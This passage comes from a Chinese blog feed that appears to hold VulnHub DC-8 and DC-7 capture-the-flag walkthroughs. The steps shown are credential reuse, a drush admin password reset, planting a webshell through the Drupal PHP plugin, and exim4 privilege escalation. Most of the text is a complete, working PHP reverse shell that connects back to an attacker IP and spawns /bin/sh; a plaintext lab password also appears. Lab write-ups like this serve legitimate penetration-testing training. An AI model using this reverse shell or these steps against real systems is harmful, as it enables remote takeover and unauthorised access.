invoke__">proc_open</span>(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set everything to non-blocking</span></span><br><span class="line">  <span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span></span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Check for end of TCP connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$sock</span>)) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check for end of STDOUT</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line">    <span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line">    <span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">    <span class="variable">$num_changed_sockets</span> = <span class="title function_ invoke__">stream_select</span>(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line">    <span class="comment">// data to process&#x27;s STDIN</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the process&#x27;s STDOUT</span></span><br><span class="line">    <span class="comment">// send data down tcp connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the process&#x27;s STDERR</span></span><br><span class="line">    <span class="comment">// send data down tcp connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$sock</span>);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">  <span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span></span><br><span class="line">  <span class="comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">?&gt;</span> </span><br><span class="line">  </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171809111.png"></p><p>kali需要提前监听,等待反弹shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171816255.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>家目录没有东西,sudo -l需要密码,但是发现一个exim4命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171819787.png"></p><p>查看exim4 版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l | grep exim</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171856431.png"></p><p>用msf搜索利用,发现需要一个会话<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171825215.png"></p><p>利用拿到的shell,反弹一个会话给msf<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171839142.png"></p><p>利用失败,再找别的exp打,找提权的<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171842636.png"></p><p>将几个exp拷贝出来,kali用python起一个http服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171845121.png"></p><p>靶机下载,注意要到tmp目录下<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171857239.png"></p><p>使用exp,在&#x2F;root下找到flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171900511.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub &lt;a href=&quot;https://www.vulnhub.com/entry/dc-8,367/&quot;&gt;https://www.vulnhub.com/entry/dc-8,367/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.149&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206171603251.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="Drupal" scheme="https://syst1m.top/tags/Drupal/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-dc7打靶</title>
    <link href="https://syst1m.top/2022/06/15/vulnhub-dc7%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/15/vulnhub-dc7%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-15T11:44:43.000Z</published>
    <updated>2022-06-16T11:42:10.603Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/entry/dc-7,356/">https://www.vulnhub.com/entry/dc-7,356/</a><br>靶机:172.16.17.148<br>攻击机kali:172.16.17.140</p><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151948527.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描靶机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151951342.png"></p><p>访问首页<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151950632.png"></p><p>cms为Drupal8,搜一下cms漏洞,尝试几个exp但不存在<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152016201.png"></p><p>扫描一下目录,都是403,没有可以利用的地方<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152017923.png"></p><p>目光来到首页,发现一个id<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152019276.png"></p><p>google在github上找到源码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152020088.png"></p><p>在配置文件翻到数据库账号密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152023471.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>拿到数据库账号密码,但是nmap扫描的时候,mysql并没有开启外链</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$user</span>name = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line"><span class="symbol">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a>撞库</h2><p>拿着账号密码撞一下登录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152029676.png"></p><p>再试一下ssh,成功登录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152031261.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>翻看家目录下的mbox文件找到敏感文件 backups.sh<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152042388.png"></p><p>发现没有权限<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152044362.png"></p><p>看一下root权限的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152047725.png"></p><p>几乎都没有权限,也没有可以利用的地方,但是这个框架有一个Drush命令<br>Drush是Drupal的命令行shell和Unix脚本接口。Drush Core附带了许多有用的命令，可用于与模块&#x2F;主题&#x2F;配置文件等代码进行交互。</p><p>修改admin密码,上网站后台看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin --password=<span class="string">&quot;123&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152059358.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>没有上传环境,但是我们可以安装插件,没有环境我们自己创造环境<br>安装本地插件,下载地址</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.drupal.org<span class="regexp">/project/</span>php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152122907.png"></p><p>启用<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152119436.png"></p><p>写webshell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152123387.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152131986.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></span><br><span class="line">  <span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line">  <span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="string">&#x27;172.16.17.140&#x27;</span>;  <span class="comment">// You have changed this</span></span><br><span class="line">  <span class="variable">$port</span> = <span class="number">4444</span>;  <span class="comment">// And this</span></span><br><span class="line">  <span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line">  <span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line">  <span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line">  <span class="comment">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">// Fork and have the parent process exit</span></span><br><span class="line">    <span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Make the current process a session leader</span></span><br><span class="line">    <span class="comment">// Will only succeed if we forked</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">posix_setsid</span>() == -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Change to a safe directory</span></span><br><span class="line">  <span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove any umask we inherited</span></span><br><span class="line">  <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Do the reverse shell...</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open reverse connection</span></span><br><span class="line">  <span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Spawn shell process</span></span><br><span class="line">  <span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">    <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">    <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set everything to non-blocking</span></span><br><span class="line">  <span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span></span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Check for end of TCP connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$sock</span>)) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check for end of STDOUT</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line">    <span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line">    <span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">    <span class="variable">$num_changed_sockets</span> = <span class="title function_ invoke__">stream_select</span>(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line">    <span class="comment">// data to process&#x27;s STDIN</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the process&#x27;s STDOUT</span></span><br><span class="line">    <span class="comment">// send data down tcp connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the process&#x27;s STDERR</span></span><br><span class="line">    <span class="comment">// send data down tcp connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$sock</span>);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">  <span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span></span><br><span class="line">  <span class="comment">// (I can&#x27;t figure out how to redirect STDOUT 